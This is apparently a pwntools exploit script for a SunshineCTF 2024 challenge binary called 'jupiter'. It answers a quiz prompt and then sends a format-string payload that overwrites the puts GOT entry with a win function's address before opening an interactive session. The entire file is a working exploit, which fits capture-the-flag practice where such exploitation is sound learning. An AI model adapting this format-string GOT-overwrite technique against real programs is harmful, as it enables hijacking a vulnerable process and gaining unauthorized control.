from pwn import *
import sys
import time

context.arch="amd64"
context.kernel="amd64"
context.os="linux"

binary_name = "jupiter"
e  = ELF(binary_name, checksec=True)
context.binary = e

REMOTE="nc 2024.sunshinectf.games 24609"

if(len(sys.argv) <2):
    print("Running locally")
    p = process(f"./{binary_name}")
else:
    if(sys.argv[1] == "remote"):
            ip, port = REMOTE.replace("nc ", "").split(" ")
            port = int(port)
            p = remote(ip, port)
    elif(sys.argv[1] == "gdb"):
        p = gdb.debug(f"./{binary_name}", gdbscript="b *0x401318", aslr=False)
    else:
        p = process(f"./{binary_name}")



def send_payload(payload):
     log.info("payload = %s" % repr(payload))
     p.sendline(payload)
     return p.recv()

def main():

    p.recvuntil(b"FL?")
    QuizAns= b"0xdeadc0de"
    p.sendline(QuizAns)

    p.recvuntil(b"beach?? ")

    PUTS_GOT = 0x403468
    win_addr = 0x4011f6

    payload = fmtstr_payload(6,{ PUTS_GOT:win_addr },write_size='int')
    p.sendline(payload)
    p.interactive()

main()



